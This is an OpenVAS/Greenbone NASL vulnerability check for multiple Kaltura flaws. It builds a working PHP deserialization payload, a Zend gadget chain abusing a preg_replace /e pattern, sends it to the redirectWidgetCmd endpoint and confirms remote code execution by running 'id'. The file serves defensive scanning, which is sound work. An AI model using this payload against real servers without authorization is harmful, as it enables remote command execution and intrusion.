# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:kaltura:kaltura";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807700");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-03-18 12:26:14 +0530 (Fri, 18 Mar 2016)");
  script_name("Kaltura Multiple Vulnerabilities");

  script_tag(name:"summary", value:"Kultura is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to execute the 'id' command and checks the response");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - An improper validation of 'kdata' parameter in 'redirectWidgetCmd'
    function

  - An improper sanitization of input in 'Upload Content' functionality.

  - An improper handling of 'file' protocol handler.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute code, to upload file and to gain access.");

  script_tag(name:"affected", value:"Kaltura version 11.1.0-2 and prior.");

  script_tag(name:"solution", value:"Upgrade to version 11.7.0-2 or later.

  NOTE: Fixes are not available for some of the issues in version 11.0.0-2.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39563/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40404/");
  script_xref(name:"URL", value:"http://www.security-assessment.com/files/documents/advisory/Kaltura-Multiple-Vulns.pdf");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_kaltura_community_edition_detect.nasl");
  script_mandatory_keys("kaltura/installed");
  script_xref(name:"URL", value:"https://www.corp.kaltura.com/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!location = get_app_location(cpe: CPE, port: port))
  exit(0);
if (location == "/")
  location = "";

cmd = "print_r(system('id')).die()";
cmd_len = strlen(cmd);

p = 'a:1:{s:1:"z";O:8:"Zend_Log":1:{s:11:"\0*\0_writers";a:1:{i:0;O:20:"Zend_Log_Writer_Mail":5:' +
    '{s:16:"\0*\0_eventsToMail";a:1:{i:0;i:1;}s:22:"\0*\0_layoutEventsToMail";a:0:{}s:8:"\0*\0_mail";O:9:"' +
    'Zend_Mail":0:{}s:10:"\0*\0_layout";O:11:"Zend_Layout":3:{s:13:"\0*\0_inflector";O:23:"' +
    'Zend_Filter_PregReplace":2:' + '{s:16:"\0*\0_matchPattern";s:7:"/(.*)/e";s:15:"\0*\0_replacement";s:' +
    cmd_len + ':"' + cmd + '";}' + 's:20:"\0*\0_inflectorEnabled";b:1;s:10:"\0*\0_layout";s:6:"layout";}' +
    's:22:"\0*\0_subjectPrependText";N;}}};}';

url = location +'/index.php/keditorservices/redirectWidgetCmd?kdata=' + urlencode(str: base64(str: p));

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

id_res = eregmatch(pattern: "(uid=[0-9]+.*gid=[0-9]+[^.]+)", string: res);
if (!isnull(id_res[1])) {
  report = "It was possible to execute the 'id' command on the remote host.\n\nResult:\n" + id_res[1] + "\n";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
